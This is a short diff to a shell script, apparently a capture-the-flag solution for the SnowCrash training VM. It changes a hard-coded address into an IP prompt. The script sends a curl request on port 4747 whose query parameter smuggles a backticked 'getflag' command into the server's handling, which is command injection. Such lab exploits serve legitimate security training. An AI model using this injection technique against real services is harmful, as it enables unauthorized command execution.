@@ -1,1 +1,3 @@
-curl "http://10.12.1.113:4747?x=\`getflag\`"
+echo -n "Please enter snowcrash vm's IP address : "
+read ip
+curl "http://$ip:4747?x=\`getflag\`"
